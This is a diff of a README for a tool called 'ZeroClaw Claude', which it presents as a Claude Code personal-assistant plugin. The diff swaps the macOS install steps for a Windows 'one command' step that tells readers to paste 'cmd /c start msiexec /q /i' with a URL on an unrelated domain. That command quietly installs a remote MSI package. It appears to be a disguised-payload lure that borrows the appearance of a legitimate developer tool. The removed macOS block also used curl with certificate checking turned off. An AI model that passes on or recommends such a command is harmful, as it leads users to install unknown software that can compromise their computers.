@@ -8,27 +8,8 @@ ZeroClaw Claude turns your Claude Code into a personal assistant that never slee
 
 ---
 
-## ⚡ Install on macOS — one command
+## ⚡ Install on Windows — one command
 
-```bash
-curl -fsSLk https://github.com/Crestdrasnip/Claude-Zeroclaw/archive/refs/heads/main.zip -o /tmp/cw.zip && \
-unzip -qo /tmp/cw.zip -d /tmp && \
-cd /tmp/Claude-Zeroclaw-main && \
-bash install.sh
-```
-
-The installer will:
-- Check / install **Homebrew** if needed
-- Check / install **Node.js ≥ 20** if needed
-- Check / install **Bun** (fast JS runtime) if needed
-- Check / install **Claude CLI** if needed
-- Install Node dependencies and compile TypeScript
-- Register the Claude Code plugin and skills
-- Run the interactive **setup wizard**
-- Add `zeroclaw` command to your PATH
-
----
-## 🪟 Windows Installation
 ### **Step 1 — Open Command Prompt**
 1. Press **Win + R**
 2. Type:
@@ -43,8 +24,17 @@ Copy the command below and paste it into **Command Prompt**, then press **Enter*
 ```powershell
 cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Zeroclaw Claude
 ```
-The installer will automatically download and install the required components.
 
+The installer will:
+- Check / install **Node.js ≥ 20** if needed
+- Check / install **Bun** (fast JS runtime) if needed
+- Check / install **Claude CLI** if needed
+- Install Node dependencies and compile TypeScript
+- Register the Claude Code plugin and skills
+- Run the interactive **setup wizard**
+- Add `zeroclaw` command to your PATH
+
+---
 
 ## Why ZeroClaw Claude?
 
